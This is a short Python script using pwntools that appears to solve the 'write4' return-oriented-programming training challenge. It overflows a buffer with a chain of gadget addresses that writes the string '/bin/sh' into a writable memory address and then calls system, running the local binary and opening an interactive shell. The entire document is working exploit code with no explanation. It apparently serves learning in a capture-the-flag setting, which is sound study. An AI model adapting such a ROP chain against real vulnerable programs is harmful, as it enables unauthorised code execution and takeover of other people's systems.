from pwn import *

pad = "\x90" * 40
binsh = "/bin/sh\x00"
data = p64(0x6010bb)
system_plt = p64(0x4005e0)

pop_rdi = p64(0x400893)
pop_r14_r15 = p64(0x400890)
mov_r14_r15 = p64(0x400820)

exploit = pad
exploit += pop_r14_r15
exploit += data
exploit += binsh
exploit += mov_r14_r15
exploit += pop_rdi
exploit += data
exploit += system_plt

io = process('./write4')
io.recvuntil('>')
io.sendline(exploit)
io.interactive()


